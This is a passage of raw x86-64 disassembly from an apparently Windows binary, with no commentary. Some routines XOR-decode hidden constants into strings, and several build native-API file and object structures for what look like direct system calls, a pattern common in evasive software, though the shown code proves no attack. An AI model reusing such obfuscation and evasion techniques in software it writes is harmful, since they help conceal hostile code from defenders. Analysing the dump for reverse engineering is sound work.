   140003f35:	0f 85 44 ff ff ff    	jne    0x140003e7f
   140003f3b:	48 8d 0d de 33 38 00 	lea    0x3833de(%rip),%rcx        # 0x140387320
   140003f42:	e8 59 29 00 00       	call   0x1400068a0
   140003f47:	48 8d 0d b2 33 38 00 	lea    0x3833b2(%rip),%rcx        # 0x140387300
   140003f4e:	48 89 c5             	mov    %rax,%rbp
   140003f51:	e8 4a 29 00 00       	call   0x1400068a0
   140003f56:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   140003f5a:	48 89 c7             	mov    %rax,%rdi
   140003f5d:	75 27                	jne    0x140003f86
   140003f5f:	c6 40 08 01          	movb   $0x1,0x8(%rax)
   140003f63:	45 31 c0             	xor    %r8d,%r8d
   140003f66:	48 b8 c6 3b 76 91 d5 	movabs $0x45f9f9d591763bc6,%rax
   140003f6d:	f9 f9 45 
   140003f70:	48 89 fa             	mov    %rdi,%rdx
   140003f73:	48 89 07             	mov    %rax,(%rdi)
   140003f76:	48 8d 0d e3 7d 00 00 	lea    0x7de3(%rip),%rcx        # 0x14000bd60
   140003f7d:	c6 45 00 01          	movb   $0x1,0x0(%rbp)
   140003f81:	e8 5a 20 00 00       	call   0x140005fe0
   140003f86:	80 7f 08 00          	cmpb   $0x0,0x8(%rdi)
   140003f8a:	74 18                	je     0x140003fa4
   140003f8c:	f3 0f 7e 07          	movq   (%rdi),%xmm0
   140003f90:	c6 47 08 00          	movb   $0x0,0x8(%rdi)
   140003f94:	f3 0f 7e 0d f4 53 38 	movq   0x3853f4(%rip),%xmm1        # 0x140389390
   140003f9b:	00 
   140003f9c:	66 0f ef c1          	pxor   %xmm1,%xmm0
   140003fa0:	66 0f d6 07          	movq   %xmm0,(%rdi)
   140003fa4:	48 89 fa             	mov    %rdi,%rdx
   140003fa7:	48 89 d9             	mov    %rbx,%rcx
   140003faa:	e8 79 7b 00 00       	call   0x14000bb28
   140003faf:	48 85 c0             	test   %rax,%rax
   140003fb2:	0f 85 c7 fe ff ff    	jne    0x140003e7f
   140003fb8:	48 8d 0d a1 33 38 00 	lea    0x3833a1(%rip),%rcx        # 0x140387360
   140003fbf:	e8 dc 28 00 00       	call   0x1400068a0
   140003fc4:	48 8d 0d 75 33 38 00 	lea    0x383375(%rip),%rcx        # 0x140387340
   140003fcb:	48 89 c5             	mov    %rax,%rbp
   140003fce:	e8 cd 28 00 00       	call   0x1400068a0
   140003fd3:	80 7d 00 00          	cmpb   $0x0,0x0(%rbp)
   140003fd7:	48 89 c7             	mov    %rax,%rdi
   140003fda:	75 27                	jne    0x140004003
   140003fdc:	c6 40 08 01          	movb   $0x1,0x8(%rax)
   140003fe0:	45 31 c0             	xor    %r8d,%r8d
   140003fe3:	48 b8 9c 6b 3f 05 6c 	movabs $0xafabab6c053f6b9c,%rax
   140003fea:	ab ab af 
   140003fed:	48 89 fa             	mov    %rdi,%rdx
   140003ff0:	48 89 07             	mov    %rax,(%rdi)
   140003ff3:	48 8d 0d 96 7d 00 00 	lea    0x7d96(%rip),%rcx        # 0x14000bd90
   140003ffa:	c6 45 00 01          	movb   $0x1,0x0(%rbp)
   140003ffe:	e8 dd 1f 00 00       	call   0x140005fe0
   140004003:	80 7f 08 00          	cmpb   $0x0,0x8(%rdi)
   140004007:	74 18                	je     0x140004021
   140004009:	f3 0f 7e 07          	movq   (%rdi),%xmm0
   14000400d:	c6 47 08 00          	movb   $0x0,0x8(%rdi)
   140004011:	f3 0f 7e 0d 7f 53 38 	movq   0x38537f(%rip),%xmm1        # 0x140389398
   140004018:	00 
   140004019:	66 0f ef c1          	pxor   %xmm1,%xmm0
   14000401d:	66 0f d6 07          	movq   %xmm0,(%rdi)
   140004021:	48 89 fa             	mov    %rdi,%rdx
   140004024:	48 89 d9             	mov    %rbx,%rcx
   140004027:	e8 fc 7a 00 00       	call   0x14000bb28
   14000402c:	48 85 c0             	test   %rax,%rax
   14000402f:	0f 85 4a fe ff ff    	jne    0x140003e7f
   140004035:	48 8b 05 84 53 38 00 	mov    0x385384(%rip),%rax        # 0x1403893c0
   14000403c:	48 8d 0d 5d 33 38 00 	lea    0x38335d(%rip),%rcx        # 0x1403873a0
   140004043:	66 0f 6f 05 55 53 38 	movdqa 0x385355(%rip),%xmm0        # 0x1403893a0
   14000404a:	00 
   14000404b:	0f 29 44 24 40       	movaps %xmm0,0x40(%rsp)
   140004050:	66 0f 6f 05 58 53 38 	movdqa 0x385358(%rip),%xmm0        # 0x1403893b0
   140004057:	00 
   140004058:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000405d:	8b 05 65 53 38 00    	mov    0x385365(%rip),%eax        # 0x1403893c8
   140004063:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   140004068:	89 44 24 68          	mov    %eax,0x68(%rsp)
   14000406c:	b8 07 87 ff ff       	mov    $0xffff8707,%eax
   140004071:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   140004076:	e8 25 28 00 00       	call   0x1400068a0
   14000407b:	48 8d 0d fe 32 38 00 	lea    0x3832fe(%rip),%rcx        # 0x140387380
   140004082:	49 89 c4             	mov    %rax,%r12
   140004085:	e8 16 28 00 00       	call   0x1400068a0
   14000408a:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   14000408f:	48 89 c5             	mov    %rax,%rbp
   140004092:	75 25                	jne    0x1400040b9
   140004094:	c6 40 2e 01          	movb   $0x1,0x2e(%rax)
   140004098:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   14000409d:	48 89 c7             	mov    %rax,%rdi
   1400040a0:	45 31 c0             	xor    %r8d,%r8d
   1400040a3:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400040a5:	48 89 c2             	mov    %rax,%rdx
   1400040a8:	41 c6 04 24 01       	movb   $0x1,(%r12)
   1400040ad:	48 8d 0d 1c 7c 00 00 	lea    0x7c1c(%rip),%rcx        # 0x14000bcd0
   1400040b4:	e8 27 1f 00 00       	call   0x140005fe0
   1400040b9:	80 7d 2e 00          	cmpb   $0x0,0x2e(%rbp)
   1400040bd:	74 2f                	je     0x1400040ee
   1400040bf:	48 ba ef b5 c9 b1 23 	movabs $0x8707dd23b1c9b5ef,%rdx
   1400040c6:	dd 07 87 
   1400040c9:	31 c0                	xor    %eax,%eax
   1400040cb:	48 89 c1             	mov    %rax,%rcx
   1400040ce:	48 89 d6             	mov    %rdx,%rsi
   1400040d1:	83 e1 07             	and    $0x7,%ecx
   1400040d4:	48 c1 e1 03          	shl    $0x3,%rcx
   1400040d8:	48 d3 ee             	shr    %cl,%rsi
   1400040db:	66 31 74 45 00       	xor    %si,0x0(%rbp,%rax,2)
   1400040e0:	48 83 c0 01          	add    $0x1,%rax
   1400040e4:	48 83 f8 17          	cmp    $0x17,%rax
   1400040e8:	75 e1                	jne    0x1400040cb
   1400040ea:	c6 45 2e 00          	movb   $0x0,0x2e(%rbp)
   1400040ee:	48 89 ea             	mov    %rbp,%rdx
   1400040f1:	48 89 d9             	mov    %rbx,%rcx
   1400040f4:	e8 2f 7a 00 00       	call   0x14000bb28
   1400040f9:	48 85 c0             	test   %rax,%rax
   1400040fc:	0f 95 c0             	setne  %al
   1400040ff:	e9 87 fc ff ff       	jmp    0x140003d8b
   140004104:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000410b:	00 00 00 00 
   14000410f:	90                   	nop
   140004110:	56                   	push   %rsi
   140004111:	53                   	push   %rbx
   140004112:	48 81 ec 88 02 00 00 	sub    $0x288,%rsp
   140004119:	31 f6                	xor    %esi,%esi
   14000411b:	48 85 c9             	test   %rcx,%rcx
   14000411e:	48 89 cb             	mov    %rcx,%rbx
   140004121:	0f 84 a9 00 00 00    	je     0x1400041d0
   140004127:	48 8d 74 24 70       	lea    0x70(%rsp),%rsi
   14000412c:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004132:	31 d2                	xor    %edx,%edx
   140004134:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   14000413b:	00 00 
   14000413d:	48 89 f1             	mov    %rsi,%rcx
   140004140:	e8 8b 79 00 00       	call   0x14000bad0
   140004145:	48 89 da             	mov    %rbx,%rdx
   140004148:	48 89 f1             	mov    %rsi,%rcx
   14000414b:	e8 c0 79 00 00       	call   0x14000bb10
   140004150:	48 89 f1             	mov    %rsi,%rcx
   140004153:	b8 08 02 00 00       	mov    $0x208,%eax
   140004158:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   14000415d:	e8 b6 79 00 00       	call   0x14000bb18
   140004162:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140004167:	45 31 c9             	xor    %r9d,%r9d
   14000416a:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   14000416f:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140004174:	01 c0                	add    %eax,%eax
   140004176:	66 0f ef c0          	pxor   %xmm0,%xmm0
   14000417a:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000417f:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   140004184:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004189:	be 01 00 00 00       	mov    $0x1,%esi
   14000418e:	c7 44 24 40 30 00 00 	movl   $0x30,0x40(%rsp)
   140004195:	00 
   140004196:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000419d:	00 00 
   14000419f:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   1400041a6:	00 
   1400041a7:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400041ac:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   1400041b1:	e8 a8 10 00 00       	call   0x14000525e
   1400041b6:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400041bb:	85 c0                	test   %eax,%eax
   1400041bd:	78 0c                	js     0x1400041cb
   1400041bf:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400041c3:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   1400041c7:	40 0f 97 c6          	seta   %sil
   1400041cb:	e8 bc 0f 00 00       	call   0x14000518c
   1400041d0:	89 f0                	mov    %esi,%eax
   1400041d2:	48 81 c4 88 02 00 00 	add    $0x288,%rsp
   1400041d9:	5b                   	pop    %rbx
   1400041da:	5e                   	pop    %rsi
   1400041db:	c3                   	ret
   1400041dc:	90                   	nop
   1400041dd:	90                   	nop
   1400041de:	90                   	nop
   1400041df:	90                   	nop
   1400041e0:	56                   	push   %rsi
   1400041e1:	53                   	push   %rbx
   1400041e2:	48 83 ec 28          	sub    $0x28,%rsp
   1400041e6:	48 89 cb             	mov    %rcx,%rbx
   1400041e9:	4c 89 c6             	mov    %r8,%rsi
   1400041ec:	e8 1f 79 00 00       	call   0x14000bb10
   1400041f1:	48 89 f2             	mov    %rsi,%rdx
   1400041f4:	48 89 d9             	mov    %rbx,%rcx
   1400041f7:	48 83 c4 28          	add    $0x28,%rsp
   1400041fb:	5b                   	pop    %rbx
   1400041fc:	5e                   	pop    %rsi
   1400041fd:	e9 06 79 00 00       	jmp    0x14000bb08
   140004202:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004209:	00 00 00 00 
   14000420d:	0f 1f 00             	nopl   (%rax)
   140004210:	53                   	push   %rbx
   140004211:	48 83 ec 20          	sub    $0x20,%rsp
   140004215:	48 89 d3             	mov    %rdx,%rbx
   140004218:	48 89 ca             	mov    %rcx,%rdx
   14000421b:	48 89 d9             	mov    %rbx,%rcx
   14000421e:	e8 ed 78 00 00       	call   0x14000bb10
   140004223:	48 89 d9             	mov    %rbx,%rcx
   140004226:	e8 ed 78 00 00       	call   0x14000bb18
   14000422b:	48 8d 44 00 fc       	lea    -0x4(%rax,%rax,1),%rax
   140004230:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140004234:	0f b7 11             	movzwl (%rcx),%edx
   140004237:	66 83 fa 2f          	cmp    $0x2f,%dx
   14000423b:	74 21                	je     0x14000425e
   14000423d:	48 8d 44 03 fe       	lea    -0x2(%rbx,%rax,1),%rax
   140004242:	eb 14                	jmp    0x140004258
   140004244:	0f 1f 40 00          	nopl   0x0(%rax)
   140004248:	0f b7 10             	movzwl (%rax),%edx
   14000424b:	48 89 c1             	mov    %rax,%rcx
   14000424e:	48 83 e8 02          	sub    $0x2,%rax
   140004252:	66 83 fa 2f          	cmp    $0x2f,%dx
   140004256:	74 06                	je     0x14000425e
   140004258:	66 83 fa 5c          	cmp    $0x5c,%dx
   14000425c:	75 ea                	jne    0x140004248
   14000425e:	31 c0                	xor    %eax,%eax
   140004260:	66 89 01             	mov    %ax,(%rcx)
   140004263:	48 83 c4 20          	add    $0x20,%rsp
   140004267:	5b                   	pop    %rbx
   140004268:	c3                   	ret
   140004269:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004270:	41 55                	push   %r13
   140004272:	41 54                	push   %r12
   140004274:	55                   	push   %rbp
   140004275:	57                   	push   %rdi
   140004276:	56                   	push   %rsi
   140004277:	53                   	push   %rbx
   140004278:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
   14000427f:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140004284:	48 89 ce             	mov    %rcx,%rsi
   140004287:	48 89 d7             	mov    %rdx,%rdi
   14000428a:	48 89 e9             	mov    %rbp,%rcx
   14000428d:	31 d2                	xor    %edx,%edx
   14000428f:	4d 89 c5             	mov    %r8,%r13
   140004292:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140004298:	e8 33 78 00 00       	call   0x14000bad0
   14000429d:	48 8b 05 2c 51 38 00 	mov    0x38512c(%rip),%rax        # 0x1403893d0
   1400042a4:	b9 23 dd ff ff       	mov    $0xffffdd23,%ecx
   1400042a9:	66 89 4c 24 28       	mov    %cx,0x28(%rsp)
   1400042ae:	48 8d 0d ab 31 38 00 	lea    0x3831ab(%rip),%rcx        # 0x140387460
   1400042b5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400042ba:	e8 e1 25 00 00       	call   0x1400068a0
   1400042bf:	48 8d 0d 7a 31 38 00 	lea    0x38317a(%rip),%rcx        # 0x140387440
   1400042c6:	49 89 c4             	mov    %rax,%r12
   1400042c9:	e8 d2 25 00 00       	call   0x1400068a0
   1400042ce:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   1400042d3:	48 89 c3             	mov    %rax,%rbx
   1400042d6:	75 2c                	jne    0x140004304
   1400042d8:	c6 40 0a 01          	movb   $0x1,0xa(%rax)
   1400042dc:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400042e1:	ba 23 dd ff ff       	mov    $0xffffdd23,%edx
   1400042e6:	45 31 c0             	xor    %r8d,%r8d
   1400042e9:	66 89 53 08          	mov    %dx,0x8(%rbx)
   1400042ed:	48 8d 0d cc 7a 00 00 	lea    0x7acc(%rip),%rcx        # 0x14000bdc0
   1400042f4:	48 89 da             	mov    %rbx,%rdx
   1400042f7:	48 89 03             	mov    %rax,(%rbx)
   1400042fa:	41 c6 04 24 01       	movb   $0x1,(%r12)
   1400042ff:	e8 dc 1c 00 00       	call   0x140005fe0
   140004304:	80 7b 0a 00          	cmpb   $0x0,0xa(%rbx)
   140004308:	74 17                	je     0x140004321
   14000430a:	48 b8 ef b5 b5 c9 c9 	movabs $0x23b1b1c9c9b5b5ef,%rax
   140004311:	b1 b1 23 
   140004314:	c6 43 0a 00          	movb   $0x0,0xa(%rbx)
   140004318:	48 31 03             	xor    %rax,(%rbx)
   14000431b:	66 81 73 08 23 dd    	xorw   $0xdd23,0x8(%rbx)
   140004321:	48 89 da             	mov    %rbx,%rdx
   140004324:	48 89 e9             	mov    %rbp,%rcx
   140004327:	e8 e4 77 00 00       	call   0x14000bb10
   14000432c:	4c 89 ea             	mov    %r13,%rdx
   14000432f:	48 89 e9             	mov    %rbp,%rcx
   140004332:	e8 d1 77 00 00       	call   0x14000bb08
   140004337:	b8 10 02 00 00       	mov    $0x210,%eax
   14000433c:	48 89 e9             	mov    %rbp,%rcx
   14000433f:	66 89 47 02          	mov    %ax,0x2(%rdi)
   140004343:	e8 d0 77 00 00       	call   0x14000bb18
   140004348:	48 89 6f 08          	mov    %rbp,0x8(%rdi)
   14000434c:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004350:	01 c0                	add    %eax,%eax
   140004352:	66 89 07             	mov    %ax,(%rdi)
   140004355:	c7 06 30 00 00 00    	movl   $0x30,(%rsi)
   14000435b:	48 c7 46 08 00 00 00 	movq   $0x0,0x8(%rsi)
   140004362:	00 
   140004363:	c7 46 18 40 00 00 00 	movl   $0x40,0x18(%rsi)
   14000436a:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   14000436e:	0f 11 46 20          	movups %xmm0,0x20(%rsi)
   140004372:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
   140004379:	5b                   	pop    %rbx
   14000437a:	5e                   	pop    %rsi
   14000437b:	5f                   	pop    %rdi
   14000437c:	5d                   	pop    %rbp
   14000437d:	41 5c                	pop    %r12
   14000437f:	41 5d                	pop    %r13
   140004381:	c3                   	ret
   140004382:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004389:	00 00 00 00 
   14000438d:	0f 1f 00             	nopl   (%rax)
   140004390:	57                   	push   %rdi
   140004391:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140004398:	31 c0                	xor    %eax,%eax
   14000439a:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   1400043a1:	00 
   1400043a2:	49 89 c8             	mov    %rcx,%r8
   1400043a5:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400043aa:	f3 48 ab             	rep stos %rax,(%rdi)
   1400043ad:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   1400043b4:	00 
   1400043b5:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400043ba:	48 89 f9             	mov    %rdi,%rcx
   1400043bd:	e8 ae fe ff ff       	call   0x140004270
   1400043c2:	ba 16 01 12 00       	mov    $0x120116,%edx
   1400043c7:	49 89 f8             	mov    %rdi,%r8
   1400043ca:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   1400043d1:	00 
   1400043d2:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400043d7:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   1400043de:	00 
   1400043df:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400043e6:	00 00 
   1400043e8:	4c 8d 0d 51 7c 38 00 	lea    0x387c51(%rip),%r9        # 0x14038c040
   1400043ef:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   1400043f6:	00 
   1400043f7:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   1400043fe:	00 
   1400043ff:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140004406:	00 
   140004407:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000440e:	00 00 
   140004410:	e8 35 0d 00 00       	call   0x14000514a
   140004415:	89 c2                	mov    %eax,%edx
   140004417:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   14000441e:	85 d2                	test   %edx,%edx
   140004420:	78 05                	js     0x140004427
   140004422:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004427:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   14000442e:	5f                   	pop    %rdi
   14000442f:	c3                   	ret
   140004430:	41 56                	push   %r14
   140004432:	41 55                	push   %r13
   140004434:	41 54                	push   %r12
   140004436:	55                   	push   %rbp
   140004437:	57                   	push   %rdi
   140004438:	56                   	push   %rsi
   140004439:	53                   	push   %rbx
   14000443a:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   140004441:	31 db                	xor    %ebx,%ebx
   140004443:	45 31 e4             	xor    %r12d,%r12d
   140004446:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   14000444d:	00 
   14000444e:	48 89 cd             	mov    %rcx,%rbp
   140004451:	e8 c2 76 00 00       	call   0x14000bb18
   140004456:	4c 8d 74 24 70       	lea    0x70(%rsp),%r14
   14000445b:	49 89 c5             	mov    %rax,%r13
   14000445e:	eb 13                	jmp    0x140004473
   140004460:	66 83 f8 2f          	cmp    $0x2f,%ax
   140004464:	74 18                	je     0x14000447e
   140004466:	48 83 c3 01          	add    $0x1,%rbx
   14000446a:	49 39 dd             	cmp    %rbx,%r13
   14000446d:	0f 82 c2 00 00 00    	jb     0x140004535
   140004473:	0f b7 44 5d 00       	movzwl 0x0(%rbp,%rbx,2),%eax
   140004478:	66 83 f8 5c          	cmp    $0x5c,%ax
   14000447c:	75 e2                	jne    0x140004460
   14000447e:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004484:	31 d2                	xor    %edx,%edx
   140004486:	48 89 f1             	mov    %rsi,%rcx
   140004489:	e8 42 76 00 00       	call   0x14000bad0
   14000448e:	48 89 ea             	mov    %rbp,%rdx
   140004491:	48 89 f1             	mov    %rsi,%rcx
   140004494:	e8 77 76 00 00       	call   0x14000bb10
   140004499:	31 c0                	xor    %eax,%eax
   14000449b:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400044a0:	49 89 f0             	mov    %rsi,%r8
   1400044a3:	66 89 04 5e          	mov    %ax,(%rsi,%rbx,2)
   1400044a7:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   1400044ae:	00 
   1400044af:	4c 89 e0             	mov    %r12,%rax
   1400044b2:	4c 89 f2             	mov    %r14,%rdx
   1400044b5:	f3 48 ab             	rep stos %rax,(%rdi)
   1400044b8:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   1400044bf:	00 
   1400044c0:	48 89 f9             	mov    %rdi,%rcx
   1400044c3:	e8 a8 fd ff ff       	call   0x140004270
   1400044c8:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400044cd:	49 89 f8             	mov    %rdi,%r8
   1400044d0:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   1400044d7:	00 
   1400044d8:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   1400044dd:	4c 8d 0d 5c 7b 38 00 	lea    0x387b5c(%rip),%r9        # 0x14038c040
   1400044e4:	ba 16 01 12 00       	mov    $0x120116,%edx
   1400044e9:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   1400044f0:	00 
   1400044f1:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   1400044f8:	00 
   1400044f9:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140004500:	00 
   140004501:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140004508:	00 
   140004509:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000450e:	e8 37 0c 00 00       	call   0x14000514a
   140004513:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000451a:	85 c0                	test   %eax,%eax
   14000451c:	78 05                	js     0x140004523
   14000451e:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004523:	e8 64 0c 00 00       	call   0x14000518c
   140004528:	48 83 c3 01          	add    $0x1,%rbx
   14000452c:	49 39 dd             	cmp    %rbx,%r13
   14000452f:	0f 83 3e ff ff ff    	jae    0x140004473
   140004535:	48 81 c4 c0 02 00 00 	add    $0x2c0,%rsp
   14000453c:	5b                   	pop    %rbx
   14000453d:	5e                   	pop    %rsi
   14000453e:	5f                   	pop    %rdi
   14000453f:	5d                   	pop    %rbp
   140004540:	41 5c                	pop    %r12
   140004542:	41 5d                	pop    %r13
   140004544:	41 5e                	pop    %r14
   140004546:	c3                   	ret
   140004547:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000454e:	00 00 
   140004550:	57                   	push   %rdi
   140004551:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140004558:	31 c0                	xor    %eax,%eax
   14000455a:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140004561:	00 
   140004562:	49 89 c8             	mov    %rcx,%r8
   140004565:	b9 06 00 00 00       	mov    $0x6,%ecx
   14000456a:	f3 48 ab             	rep stos %rax,(%rdi)
   14000456d:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140004574:	00 
   140004575:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000457a:	48 89 f9             	mov    %rdi,%rcx
   14000457d:	e8 ee fc ff ff       	call   0x140004270
   140004582:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140004587:	49 89 f8             	mov    %rdi,%r8
   14000458a:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140004591:	00 
   140004592:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140004597:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   14000459e:	00 
   14000459f:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400045a6:	00 00 
   1400045a8:	4c 8d 0d 91 7a 38 00 	lea    0x387a91(%rip),%r9        # 0x14038c040
   1400045af:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400045b6:	00 
   1400045b7:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400045be:	00 
   1400045bf:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400045c6:	00 
   1400045c7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400045ce:	00 00 
   1400045d0:	e8 75 0b 00 00       	call   0x14000514a
   1400045d5:	89 c2                	mov    %eax,%edx
   1400045d7:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400045de:	85 d2                	test   %edx,%edx
   1400045e0:	78 05                	js     0x1400045e7
   1400045e2:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1400045e7:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   1400045ee:	5f                   	pop    %rdi
   1400045ef:	c3                   	ret
   1400045f0:	57                   	push   %rdi
   1400045f1:	53                   	push   %rbx
   1400045f2:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400045f9:	31 c0                	xor    %eax,%eax
   1400045fb:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   140004600:	49 89 c8             	mov    %rcx,%r8
   140004603:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004608:	f3 48 ab             	rep stos %rax,(%rdi)
   14000460b:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   140004610:	89 d3                	mov    %edx,%ebx
   140004612:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004617:	48 89 f9             	mov    %rdi,%rcx
   14000461a:	e8 51 fc ff ff       	call   0x140004270
   14000461f:	84 db                	test   %bl,%bl
   140004621:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140004628:	00 
   140004629:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   14000462e:	74 40                	je     0x140004670
   140004630:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140004637:	00 
   140004638:	4c 8d 0d 01 7a 38 00 	lea    0x387a01(%rip),%r9        # 0x14038c040
   14000463f:	49 89 f8             	mov    %rdi,%r8
   140004642:	ba 00 00 10 80       	mov    $0x80100000,%edx
   140004647:	e8 5b 0b 00 00       	call   0x1400051a7
   14000464c:	85 c0                	test   %eax,%eax
   14000464e:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   140004655:	78 05                	js     0x14000465c
   140004657:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000465c:	48 89 d0             	mov    %rdx,%rax
   14000465f:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140004666:	5b                   	pop    %rbx
   140004667:	5f                   	pop    %rdi
   140004668:	c3                   	ret
   140004669:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004670:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140004677:	00 
   140004678:	4c 8d 0d c1 79 38 00 	lea    0x3879c1(%rip),%r9        # 0x14038c040
   14000467f:	49 89 f8             	mov    %rdi,%r8
   140004682:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140004687:	e8 1b 0b 00 00       	call   0x1400051a7
   14000468c:	eb be                	jmp    0x14000464c
   14000468e:	66 90                	xchg   %ax,%ax
   140004690:	41 54                	push   %r12
   140004692:	55                   	push   %rbp
   140004693:	57                   	push   %rdi
   140004694:	56                   	push   %rsi
   140004695:	53                   	push   %rbx
   140004696:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   14000469d:	31 c0                	xor    %eax,%eax
   14000469f:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   1400046a4:	49 89 c8             	mov    %rcx,%r8
   1400046a7:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400046ac:	f3 48 ab             	rep stos %rax,(%rdi)
   1400046af:	4c 8d 64 24 60       	lea    0x60(%rsp),%r12
   1400046b4:	48 89 d3             	mov    %rdx,%rbx
   1400046b7:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   1400046bc:	4c 89 e2             	mov    %r12,%rdx
   1400046bf:	48 8d 6c 24 58       	lea    0x58(%rsp),%rbp
   1400046c4:	48 89 f9             	mov    %rdi,%rcx
   1400046c7:	e8 a4 fb ff ff       	call   0x140004270
   1400046cc:	49 89 f8             	mov    %rdi,%r8
   1400046cf:	ba 00 00 10 80       	mov    $0x80100000,%edx
   1400046d4:	48 89 e9             	mov    %rbp,%rcx
